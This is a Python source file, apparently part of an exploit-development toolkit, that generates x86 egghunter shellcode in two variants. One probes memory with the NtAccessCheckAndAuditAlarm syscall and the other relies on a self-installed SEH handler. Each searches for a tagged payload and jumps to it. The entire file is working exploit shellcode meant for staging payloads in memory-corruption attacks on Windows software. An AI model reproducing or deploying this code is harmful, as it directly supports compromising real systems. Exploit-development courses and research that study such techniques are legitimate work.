from coder.util import convert_tag_hex


def generate_ntaccess(tag, debug=False):
    tag_hex = convert_tag_hex(tag)

    return f"""
    start:
        {'int3' if debug else ''}

    loop_inc_page:
        or dx, 0x0fff

    loop_inc_one:
        inc edx

    loop_check:
        push edx
        mov eax, 0xfffffe3a
        neg eax
        int 0x2e
        cmp al,05
        pop edx

    loop_check_valid:
        je loop_inc_page

    is_egg:
        mov eax, {tag_hex}
        mov edi, edx
        scasd
        jnz loop_inc_one
        scasd
        jnz loop_inc_one

    matched:
        jmp edi
    """


def generate_seh(tag, debug=False):
    tag_hex = convert_tag_hex(tag)

    return f"""
    start:
        {'int3' if debug else ''}
        jmp get_seh_address

    build_exception_record:
        pop ecx
        mov eax, {tag_hex}
        push ecx
        push 0xffffffff
        xor ebx, ebx
        mov dword ptr fs:[ebx], esp
        sub ecx, 0x04
        add ebx, 0x04
        mov dword ptr fs:[ebx], ecx

    is_egg:
        push 0x02
        pop ecx
        mov edi, ebx
        repe scasd
        jnz loop_inc_one
        jmp edi

    loop_inc_page:
        or bx, 0xfff

    loop_inc_one:
        inc ebx
        jmp is_egg

    get_seh_address:
        call build_exception_record
        push 0x0c
        pop ecx
        mov eax, [esp+ecx]
        mov cl, 0xb8
        add dword ptr ds:[eax+ecx], 0x06
        pop eax
        add esp, 0x10
        push eax
        xor eax, eax
        ret
    """
